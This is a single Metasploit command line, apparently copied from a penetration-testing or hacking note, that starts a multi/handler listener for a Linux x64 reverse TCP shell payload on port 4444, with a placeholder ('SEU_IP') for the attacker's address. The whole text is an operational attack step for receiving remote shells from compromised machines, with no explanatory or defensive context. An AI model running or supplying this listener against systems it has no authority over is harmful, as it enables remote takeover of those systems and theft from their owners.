msfconsole -q -x "use multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST SEU_IP; set LPORT 4444; run"
